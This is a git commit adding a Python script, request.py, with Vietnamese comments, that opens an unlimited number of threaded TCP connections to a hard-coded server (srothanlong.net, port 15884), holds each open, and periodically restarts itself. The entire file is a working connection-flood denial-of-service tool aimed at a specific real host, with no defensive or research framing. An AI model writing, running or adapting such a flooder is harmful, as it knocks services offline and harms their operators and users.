af64f75c0a0651c96df5b6c011aedf85a0a7b8e5
vsro123 <132996817+vsro123@users.noreply.github.com>
2024-10-11 21:48:09 +0700

    Add files via upload

---
+++ request.py
@@ -0,0 +1,34 @@
+import threading
+import socket
+import time
+import os
+import sys
+
+# Hàm để tạo kết nối
+def create_connection(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        print(f"Kết nối thành công đến {host}:{port}")
+        while True:
+            time.sleep(6000)  # Giữ kết nối
+    except Exception as e:
+        print(f"Lỗi kết nối: {e}")
+
+# Hàm để tạo nhiều luồng kết nối không giới hạn
+def unlimited_connections(host, port):
+    while True:
+        t = threading.Thread(target=create_connection, args=(host, port))
+        t.start()
+        # time.sleep(0.1)  # Gửi 5 yêu cầu mỗi giây
+
+if __name__ == "__main__":
+    host = "srothanlong.net"  # Địa chỉ IP của máy chủ
+    port = 15884           # Cổng của máy chủ
+
+    while True:
+        p = threading.Thread(target=unlimited_connections, args=(host, port))
+        p.start()
+        time.sleep(100)  # Chờ 10 phút
+        print("Khởi động lại chương trình...")
+        os.execv(sys.executable, ['python'] + sys.argv)
